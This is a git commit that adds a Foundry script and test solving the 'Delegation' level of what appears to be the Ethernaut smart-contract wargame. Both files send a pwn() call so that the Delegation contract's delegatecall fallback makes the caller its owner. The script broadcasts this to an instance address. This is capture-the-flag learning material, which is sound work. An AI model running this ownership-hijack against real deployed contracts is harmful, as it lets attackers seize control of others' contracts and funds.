f264241e50930f5b34589dc95ce914cfb54421c9
zapaz.eth <alain@kredeum.com>
2022-10-17 20:27:15 +0200

    level06

---
+++ script/06_delegation.sol
@@ -0,0 +1,20 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.6.0;
+
+import "forge-std/Script.sol";
+import "instances/06_delegation.sol";
+
+contract AttackerDelegationScript is Script {
+    Delegation delegation = Delegation(vm.envAddress("INSTANCE"));
+
+    function run() external {
+        vm.startBroadcast();
+
+        (bool success, ) = address(delegation).call(
+            abi.encodeWithSignature("pwn()")
+        );
+        require(success, "Call failed");
+
+        vm.stopBroadcast();
+    }
+}
---
+++ test/06_delegation.sol
@@ -0,0 +1,27 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.6.0;
+
+import "forge-std/Test.sol";
+import "instances/06_delegation.sol";
+
+contract AttackerDelegationTest is Test {
+    function testLevel06() external {
+        vm.prank(address(0x1));
+        Delegate delegate = new Delegate(address(0x2));
+
+        vm.prank(address(0x2));
+        Delegation delegation = new Delegation(address(delegate));
+
+        console.log("Current owner is : ", delegation.owner());
+        assertFalse(delegation.owner() == address(this));
+
+        (bool success, ) = address(delegation).call(
+            abi.encodeWithSignature("pwn()")
+        );
+        require(success, "Call failed");
+
+        assertTrue(delegation.owner() == address(this));
+        console.log("Checking delegatecall result : ", success);
+        console.log("New owner is : ", delegation.owner());
+    }
+}
